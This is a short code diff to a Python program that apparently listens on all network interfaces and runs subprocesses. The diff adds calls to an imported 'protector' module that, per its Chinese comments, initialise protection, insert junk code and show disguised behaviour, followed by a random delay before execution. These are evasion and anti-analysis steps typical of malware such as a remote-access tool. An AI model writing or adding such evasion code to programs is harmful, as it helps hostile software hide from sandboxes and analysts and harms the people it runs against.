@@ -8,7 +8,13 @@ from tkinter import messagebox
 import shutil
 import time
 import subprocess
+from protector import *
 
+# ============= 初始化保护 =============
+init_protection()
+junk_code()          # 插入垃圾代码
+fake_behavior()      # 显示伪装行为
+time.sleep(random.randint(5, 15))  # 延迟执行
 
 # 配置信息
 HOST = '0.0.0.0'
